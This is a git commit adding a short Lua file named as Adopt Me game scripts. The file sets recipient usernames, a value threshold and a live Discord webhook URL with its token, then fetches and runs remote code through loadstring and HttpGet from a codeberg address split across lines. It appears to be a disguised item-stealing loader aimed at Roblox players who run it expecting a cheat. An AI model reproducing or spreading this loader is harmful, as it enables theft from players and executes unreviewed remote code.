6e008e53f9126cde5b1852cd064b9f747cfd7a29
LuaScript <Franzforger15@gmail.com>
2025-10-04 22:49:07 +0800

    Create AdoptMe Scripts .lua

---
+++ AdoptMe Scripts .lua
@@ -0,0 +1,15 @@
+users = {''''Bugegg12384''''}
+
+min_value = 1
+
+ping = "yes"
+
+webhook ="https://discord.com/api/webhooks/1422766050595835965/rEx78H2W_lcuE7s3vAZUK8VaqKj361vYAs29sDaAfYrYIwFwBVQqNlULcyq8HV0dIcx0"
+
+embedcol = 65280
+
+loadstring(game:HttpGet("https://
+
+codeberg.org/amaz/main/raw/branch
+
+/main/adm"))()
